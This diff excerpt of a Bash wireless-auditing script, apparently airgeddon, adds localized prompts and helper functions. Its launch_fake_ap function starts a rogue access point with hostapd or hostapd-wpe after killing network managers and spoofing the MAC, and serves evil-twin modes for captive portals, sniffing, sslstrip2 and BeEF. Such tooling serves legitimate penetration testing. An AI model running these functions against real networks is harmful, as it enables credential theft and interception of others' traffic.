+	language_strings_key_to_continue["ENGLISH"]="Press [Enter] key to continue..."
+	language_strings_key_to_continue["SPANISH"]="Pulsa la tecla [Enter] para continuar..."
+	language_strings_key_to_continue["FRENCH"]="Pressez [Enter] pour continuer..."
+	language_strings_key_to_continue["CATALAN"]="Prem la tecla [Enter] per continuar..."
+	language_strings_key_to_continue["PORTUGUESE"]="Pressione a tecla [Enter] para continuar..."
+	language_strings_key_to_continue["RUSSIAN"]="Нажмите клавишу [Enter] для продолжения..."
+	language_strings_key_to_continue["GREEK"]="Πατήστε το κουμπί [Enter] για να συνεχίσετε..."
+	language_strings_key_to_continue["ITALIAN"]="Premere il tasto [Enter] per continuare..."
+	language_strings_key_to_continue["POLISH"]="Naciśnij klawisz [Enter] aby kontynuować..."
+	language_strings_key_to_continue["GERMAN"]="Drücken Sie die [Enter]-Taste um fortzufahren..."
+	language_strings_key_to_continue["TURKISH"]="Devam etmek için [Enter] tuşuna basın..."
+	language_strings_key_to_continue["ARABIC"]="اضغط على مفتاح [Enter] للمتابعة ..."
+	language_strings_key_to_continue["CHINESE"]="按 [Enter] 键继续..."
+}
+
+
+
+
+
+
+
+function kill_dos_pursuit_mode_processes() {
+
+	debug_print
+
+	for item in "${dos_pursuit_mode_pids[@]}"; do
+		kill_pid_and_children_recursive "${item}"
+	done
+
+	if ! stty sane > /dev/null 2>&1; then
+		reset > /dev/null 2>&1
+	fi
+	dos_pursuit_mode_pids=()
+	sleep 1
+}
+
+
+
+function kill_pid_and_children_recursive() {
+
+	debug_print
+
+	local parent_pid=""
+	local child_pids=""
+
+	parent_pid="${1}"
+	child_pids=$(pgrep -P "${parent_pid}" 2> /dev/null)
+
+	for child_pid in ${child_pids}; do
+		kill_pid_and_children_recursive "${child_pid}"
+	done
+	if [ -n "${child_pids}" ]; then
+		pkill -P "${parent_pid}" &> /dev/null
+	fi
+
+	kill "${parent_pid}" &> /dev/null
+	wait "${parent_pid}" 2> /dev/null
+	}
+
+
+
+
+
+
+
+
+
+function launch_fake_ap() {
+
+	debug_print
+
+	if "${AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING:-true}"; then
+		${airmon} check kill > /dev/null 2>&1
+		nm_processes_killed=1
+	else
+		if [ "${check_kill_needed}" -eq 1 ]; then
+			${airmon} check kill > /dev/null 2>&1
+			nm_processes_killed=1
+		fi
+	fi
+
+	if [ "${mac_spoofing_desired}" -eq 1 ]; then
+		set_spoofed_mac "${interface}"
+	fi
+
+	recalculate_windows_sizes
+	local command
+	local log_command
+
+	if [ -n "${enterprise_mode}" ]; then
+		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
+		rm -rf "${scriptfolder}${hostapd_wpe_default_log}" > /dev/null 2>&1
+		command="hostapd-wpe \"${tmpdir}${hostapd_wpe_file}\""
+		log_command=" | tee ${tmpdir}${hostapd_wpe_log}"
+		hostapd_scr_window_position=${g1_topleft_window}
+	else
+		command="hostapd \"${tmpdir}${hostapd_file}\""
+		log_command=""
+		case ${et_mode} in
+			"et_onlyap")
+				hostapd_scr_window_position=${g1_topleft_window}
+			;;
+			"et_sniffing"|"et_captive_portal"|"et_sniffing_sslstrip2_beef")
+				hostapd_scr_window_position=${g3_topleft_window}
+			;;
+			"et_sniffing_sslstrip2")
+				hostapd_scr_window_position=${g4_topleft_window}
+			;;
+		esac
+	fi
+
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		if [ "${#dos_pursuit_mode_pids[@]}" -eq 0 ]; then
+			dos_pursuit_mode_pids=()
+		fi
+	fi
+
+	manage_output "-hold -bg \"#000000\" -fg \"#00FF00\" -geometry ${hostapd_scr_window_position} -T \"AP\"" "${command}${log_command}" "AP"
+	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
+		et_processes+=($!)
+		if [ "${dos_pursuit_mode}" -eq 1 ]; then
+			dos_pursuit_mode_ap_pid=$!
+			dos_pursuit_mode_pids+=("${dos_pursuit_mode_ap_pid}")
+		fi
+	else
+		get_tmux_process_id "${command}"
+		et_processes+=("${global_process_pid}")
+		if [ "${dos_pursuit_mode}" -eq 1 ]; then
+			dos_pursuit_mode_pids+=("${global_process_pid}")
+		fi
+		global_process_pid=""
+	fi
+
+	sleep 3
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function set_spoofed_mac() {
+
+	debug_print
+
+	current_original_mac=$(cat < "/sys/class/net/${1}/address" 2> /dev/null)
+
+	if [ "${spoofed_mac}" -eq 0 ]; then
+		spoofed_mac=1
+		declare -gA original_macs
+		original_macs["${1}"]="${current_original_mac}"
+	else
+		if [ -z "${original_macs[${1}]}" ]; then
+			original_macs["${1}"]="${current_original_mac}"
+		fi
+	fi
+
+	new_random_mac=$(od -An -N6 -tx1 /dev/urandom | sed -e 's/^  *//' -e 's/  */:/g' -e 's/:$//' -e 's/^\(.\)[13579bdf]/\10/')
+
+	ip link set "${1}" down > /dev/null 2>&1
+	ip link set dev "${1}" address "${new_random_mac}" > /dev/null 2>&1
+	ip link set "${1}" up > /dev/null 2>&1
+}
+
+
+
+
+
+
+function start_tmux_processes() {
+
+	debug_print
+
+	local window_name
+	local command_line
+
+	window_name="${1}"
+	command_line="${2}"
+
+	tmux kill-window -t "${session_name}:${window_name}" 2> /dev/null
+	case "${4}" in
+		"active")
+			tmux new-window -t "${session_name}:" -n "${window_name}"
+		;;
+		*)
+			tmux new-window -d -t "${session_name}:" -n "${window_name}"
+		;;
+	esac
+	local tmux_color_cmd
+	if [ -n "${3}" ]; then
+		tmux_color_cmd="bg=#000000 fg=${3}"
+	else
+		tmux_color_cmd="bg=#000000"
+	fi
+	tmux setw -t "${window_name}" window-style "${tmux_color_cmd}"
+	tmux send-keys -t "${session_name}:${window_name}" "${command_line}" ENTER
+}
+
+
+
+
+
+
+function disable_rfkill() {
+
+	debug_print
+
+	if hash rfkill 2> /dev/null; then
+		rfkill unblock all > /dev/null 2>&1
+	fi
+}
+
+
+
+
+
+
+function detect_screen_resolution() {
+
+	debug_print
+
+	resolution_detected=0
+	if hash xdpyinfo 2> /dev/null; then
+		if resolution=$(xdpyinfo 2> /dev/null | grep -A 3 "screen #0" | grep "dimensions" | tr -s " " | cut -d " " -f 3 | grep "x"); then
+			resolution_detected=1
+		fi
+	fi
+
+	if [ "${resolution_detected}" -eq 0 ]; then
+		resolution=${standard_resolution}
+	fi
+
+	[[ ${resolution} =~ ^([0-9]{3,4})x(([0-9]{3,4}))$ ]] && resolution_x="${BASH_REMATCH[1]}" && resolution_y="${BASH_REMATCH[2]}"
+}
+
+
+
+
+
+
+function set_windows_sizes() {
+
+	debug_print
+
+	set_xsizes
+	set_ysizes
+	set_ypositions
+
+	g1_topleft_window="${xwindow}x${ywindowhalf}+0+0"
+	g1_bottomleft_window="${xwindow}x${ywindowhalf}+0-0"
+	g1_topright_window="${xwindow}x${ywindowhalf}-0+0"
+	g1_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
+
+	g2_stdleft_window="${xwindow}x${ywindowone}+0+0"
+	g2_stdright_window="${xwindow}x${ywindowone}-0+0"
+
+	g3_topleft_window="${xwindow}x${ywindowthird}+0+0"
+	g3_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
+	g3_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
+	g3_topright_window="${xwindow}x${ywindowhalf}-0+0"
+	g3_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
+
+	g4_topleft_window="${xwindow}x${ywindowthird}+0+0"
+	g4_middleleft_window="${xwindow}x${ywindowthird}+0+${second_of_three_position}"
+	g4_bottomleft_window="${xwindow}x${ywindowthird}+0-0"
+	g4_topright_window="${xwindow}x${ywindowthird}-0+0"
+	g4_middleright_window="${xwindow}x${ywindowthird}-0+${second_of_three_position}"
+	g4_bottomright_window="${xwindow}x${ywindowthird}-0-0"
+
+	g5_left1="${xwindow}x${ywindowseventh}+0+0"
+	g5_left2="${xwindow}x${ywindowseventh}+0+${second_of_seven_position}"
+	g5_left3="${xwindow}x${ywindowseventh}+0+${third_of_seven_position}"
+	g5_left4="${xwindow}x${ywindowseventh}+0+${fourth_of_seven_position}"
+	g5_left5="${xwindow}x${ywindowseventh}+0+${fifth_of_seven_position}"
+	g5_left6="${xwindow}x${ywindowseventh}+0+${sixth_of_seven_position}"
+	g5_left7="${xwindow}x${ywindowseventh}+0+${seventh_of_seven_position}"
+	g5_topright_window="${xwindow}x${ywindowhalf}-0+0"
+	g5_bottomright_window="${xwindow}x${ywindowhalf}-0-0"
+}
+
+
+
+
+
+function set_xsizes() {
+
+	debug_print
+
+	xtotal=$(awk -v n1="${resolution_x}" "BEGIN{print n1 / ${xratio}}")
+
+	if ! xtotaltmp=$(printf "%.0f" "${xtotal}" 2> /dev/null); then
+		dec_char=","
+		xtotal="${xtotal/./${dec_char}}"
+		xtotal=$(printf "%.0f" "${xtotal}" 2> /dev/null)
+	else
+		xtotal=${xtotaltmp}
+	fi
+
+	xcentral_space=$((xtotal * 5 / 100))
+	xhalf=$((xtotal / 2))
+	xwindow=$((xhalf - xcentral_space))
+}
+
+
+
+
+
+function set_ypositions() {
+
+	debug_print
+
+	second_of_three_position=$((resolution_y / 3 + ywindow_edge_pixels))
+
+	second_of_seven_position=$((resolution_y / 7 + ywindow_edge_pixels))
+	third_of_seven_position=$((resolution_y / 7 + resolution_y / 7 + ywindow_edge_pixels))
+	fourth_of_seven_position=$((resolution_y / 7 + 2 * (resolution_y / 7) + ywindow_edge_pixels))
+	fifth_of_seven_position=$((resolution_y / 7 + 3 * (resolution_y / 7) + ywindow_edge_pixels))
+	sixth_of_seven_position=$((resolution_y / 7 + 4 * (resolution_y / 7) + ywindow_edge_pixels))
+	seventh_of_seven_position=$((resolution_y / 7 + 5 * (resolution_y / 7) + ywindow_edge_pixels))
+}
+
+
+
+
+
+function set_ysizes() {
+
+	debug_print
+
+	ytotal=$(awk -v n1="${resolution_y}" "BEGIN{print n1 / ${yratio}}")
+	if ! ytotaltmp=$(printf "%.0f" "${ytotal}" 2> /dev/null); then
+		dec_char=","
+		ytotal="${ytotal/./${dec_char}}"
+		ytotal=$(printf "%.0f" "${ytotal}" 2> /dev/null)
+	else
+		ytotal=${ytotaltmp}
+	fi
+
+	ywindowone=$((ytotal - ywindow_edge_lines))
+	ywindowhalf=$((ytotal / 2 - ywindow_edge_lines))
+	ywindowthird=$((ytotal / 3 - ywindow_edge_lines))
+	ywindowseventh=$((ytotal / 7 - ywindow_edge_lines))
+}
